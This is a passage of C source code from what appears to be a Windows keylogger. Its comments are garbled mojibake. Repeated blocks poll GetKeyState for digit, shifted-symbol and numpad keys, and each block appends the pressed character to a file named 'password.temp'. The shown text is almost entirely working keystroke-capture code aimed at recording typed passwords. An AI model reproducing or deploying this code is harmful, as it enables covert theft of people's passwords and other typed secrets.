					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "&\n");
					fclose(fp);
					seven = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "7\n");
					fclose(fp);
					seven = 5000000;
				}
			}
			else if (down7 == 0)
			{
				seven = -32767;
			}
		}

		down8 = GetKeyState('8');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down8 == eight)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "*\n");
					fclose(fp);
					eight = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "8\n");
					fclose(fp);
					eight = 5000000;
				}
			}
			else if (down8 == 0)
			{
				eight = -32767;
			}
		}

		down9 = GetKeyState('9');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down9 == nine)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "(\n");
					fclose(fp);
					nine = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "9\n");
					fclose(fp);
					nine = 5000000;
				}
			}
			else if (down9 == 0)
			{
				nine = -32767;
			}
		}

		downZERO = GetKeyState(VK_NUMPAD0);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downZERO == ZEROO)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "0\n");
					fclose(fp);
					ZEROO = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "0\n");
					fclose(fp);
					ZEROO = 5000000;
				}
			}
			else if (downZERO == 0)
			{
				ZEROO = -32767;
			}
		}

		downONE = GetKeyState(VK_NUMPAD1);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downONE == ONEE)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "1\n");
					fclose(fp);
					ONEE = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "1\n");
					fclose(fp);
					ONEE = 5000000;
				}
			}
			else if (downONE == 0)
			{
				ONEE = -32767;
			}
		}

		downTWO = GetKeyState(VK_NUMPAD2);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downTWO == TWOO)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "2\n");
					fclose(fp);
					TWOO = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "2\n");
					fclose(fp);
					TWOO = 5000000;
				}
			}
			else if (downTWO == 0)
			{
				TWOO = -32767;
			}
		}

		downTHREE = GetKeyState(VK_NUMPAD3);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downTHREE == THREEE)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "3\n");
					fclose(fp);
					THREEE = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "3\n");
					fclose(fp);
					THREEE = 5000000;
				}
			}
			else if (downTHREE == 0)
			{
				THREEE = -32767;
			}
		}

		downFOUR = GetKeyState(VK_NUMPAD4);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downFOUR == FOURR)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "4\n");
					fclose(fp);
					FOURR = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "4\n");
					fclose(fp);
					FOURR = 5000000;
				}
			}
			else if (downFOUR == 0)
			{
				FOURR = -32767;
			}
		}

		downFIVE = GetKeyState(VK_NUMPAD5);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downFIVE == FIVEE)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "5\n");
					fclose(fp);
					FIVEE = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "5\n");
					fclose(fp);
					FIVEE = 5000000;
				}
			}
			else if (downFIVE == 0)
			{
				FIVEE = -32767;
			}
		}

		downSIX = GetKeyState(VK_NUMPAD6);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downSIX == SIXX)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "6\n");
					fclose(fp);
					SIXX = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "6\n");
					fclose(fp);
					SIXX = 5000000;
				}
			}
			else if (downSIX == 0)
			{
				SIXX = -32767;
			}
		}

		downSEVEN = GetKeyState(VK_NUMPAD7);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downSEVEN == SEVENN)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "7\n");
					fclose(fp);
					SEVENN = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "7\n");
					fclose(fp);
					SEVENN = 5000000;
				}
			}
			else if (downSEVEN == 0)
			{
				SEVENN = -32767;
			}
		}

		downEIGHT = GetKeyState(VK_NUMPAD8);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downEIGHT == EIGHTT)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "8\n");
					fclose(fp);
					EIGHTT = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "8\n");
					fclose(fp);
					EIGHTT = 5000000;
				}
			}
			else if (downEIGHT == 0)
			{
				EIGHTT = -32767;
			}
		}

		downNINE = GetKeyState(VK_NUMPAD9);//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downNINE == NINEE)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "9\n");
					fclose(fp);
					NINEE = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "9\n");
					fclose(fp);
					NINEE = 5000000;
				}
			}
			else if (downNINE == 0)
			{
				NINEE = -32767;
			}
		}
	}
	return 0;
}